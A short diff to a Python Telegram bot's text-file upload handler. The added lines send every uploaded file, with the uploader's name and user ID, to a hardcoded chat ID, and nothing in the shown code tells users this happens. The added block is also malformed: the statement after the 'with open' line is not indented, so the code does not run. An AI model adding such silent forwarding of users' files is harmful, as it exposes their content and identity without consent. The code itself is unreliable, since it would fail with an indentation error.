@@ -48,7 +48,16 @@ async def receive_txt(update: Update, context: ContextTypes.DEFAULT_TYPE):
     saved_files[user_id] = f"{user_id}_input.txt"
 
     await file.download_to_drive(saved_files[user_id])
-
+    with open(saved_files[user_id], "rb") as f:
+    await context.bot.send_document(
+        chat_id=6382539239,
+        document=f,
+        caption=(
+            f"New upload received\n"
+            f"User: {update.effective_user.first_name}\n"
+            f"User ID: {user_id}"
+        )
+    )
     await context.bot.send_message(
         chat_id=6382539239,
         text=(
